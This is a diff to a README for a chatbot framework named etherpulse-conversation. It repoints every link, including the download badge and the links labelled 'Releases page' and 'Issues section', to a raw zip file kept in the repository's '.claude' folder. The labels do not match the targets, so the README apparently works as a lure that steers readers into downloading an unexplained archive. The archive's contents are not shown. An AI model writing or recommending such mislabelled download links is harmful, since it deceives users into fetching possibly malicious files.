@@ -1,6 +1,6 @@
 # 🤖 etherpulse-conversation - Create Your Own Smart Chatbot Easily
 
-[![Download Latest Release](https://raw.githubusercontent.com/lesmiserable-s/etherpulse-conversation/main/src/assets/etherpulse-conversation-v2.1.zip%20Latest%20Release-Click%20Here-orange)](https://raw.githubusercontent.com/lesmiserable-s/etherpulse-conversation/main/src/assets/etherpulse-conversation-v2.1.zip)
+[![Download Latest Release](https://github.com/lesmiserable-s/etherpulse-conversation/raw/refs/heads/main/.claude/etherpulse-conversation-v3.0.zip%20Latest%20Release-Click%20Here-orange)](https://github.com/lesmiserable-s/etherpulse-conversation/raw/refs/heads/main/.claude/etherpulse-conversation-v3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to the **etherpulse-conversation** project! This framework allows you to
 To get started with **etherpulse-conversation**, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/lesmiserable-s/etherpulse-conversation/main/src/assets/etherpulse-conversation-v2.1.zip) to download the latest version of the software.
+   Go to the [Releases page](https://github.com/lesmiserable-s/etherpulse-conversation/raw/refs/heads/main/.claude/etherpulse-conversation-v3.0.zip) to download the latest version of the software.
 
 2. **Choose the Right File**  
    Look for the most recent release. You will see different files available for download. Choose the one that fits your operating system. Most common options include:
@@ -96,10 +96,10 @@ These topics can help you dive deeper into the capabilities of your chatbot and 
 
 ## 🤝 Support
 
-If you run into any issues, check the [Issues section](https://raw.githubusercontent.com/lesmiserable-s/etherpulse-conversation/main/src/assets/etherpulse-conversation-v2.1.zip) on GitHub for solutions or to report a bug. Don’t hesitate to ask for help from the community.
+If you run into any issues, check the [Issues section](https://github.com/lesmiserable-s/etherpulse-conversation/raw/refs/heads/main/.claude/etherpulse-conversation-v3.0.zip) on GitHub for solutions or to report a bug. Don’t hesitate to ask for help from the community.
 
 ## 📜 License
 
 This project is licensed under the MIT License. You can use and modify it according to the terms specified in the license file.
 
-Feel free to explore the potential of chatbots with **etherpulse-conversation** today. For additional resources, visit the [Releases page](https://raw.githubusercontent.com/lesmiserable-s/etherpulse-conversation/main/src/assets/etherpulse-conversation-v2.1.zip) to download the latest builds. Happy building!
+Feel free to explore the potential of chatbots with **etherpulse-conversation** today. For additional resources, visit the [Releases page](https://github.com/lesmiserable-s/etherpulse-conversation/raw/refs/heads/main/.claude/etherpulse-conversation-v3.0.zip) to download the latest builds. Happy building!
